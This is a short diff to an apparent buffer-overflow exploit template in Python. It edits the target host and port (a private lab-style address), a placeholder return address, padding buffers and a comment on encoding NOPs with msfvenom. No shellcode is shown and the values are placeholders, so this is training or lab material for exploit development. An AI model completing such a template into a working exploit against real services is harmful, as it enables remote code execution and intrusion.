@@ -5,8 +5,8 @@ import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 ##HOST OPTIONS##
-HOST = "10.11.10.143"
-PORT = 110
+HOST = "10.10.10.10"
+PORT = 1111
 
 ###Required Buffer Sections###
 
@@ -17,7 +17,7 @@ junk = "A"*10
 jmp_esp = "\x00\x00\x00\x00"
 
 #nop_slide = "\x90"*1
-#Use MSF to encode the Nops directly into the payload. You can eliminate the need for padding with this too Just create the payload the exact size of the required space. Using nops for padding.
+#Use msfvenom encode the Nops directly into the payload. You can eliminate the need for padding with this too Just create the payload the exact size of the required space. Using nops for padding.
 
 padding = "C"*10
 
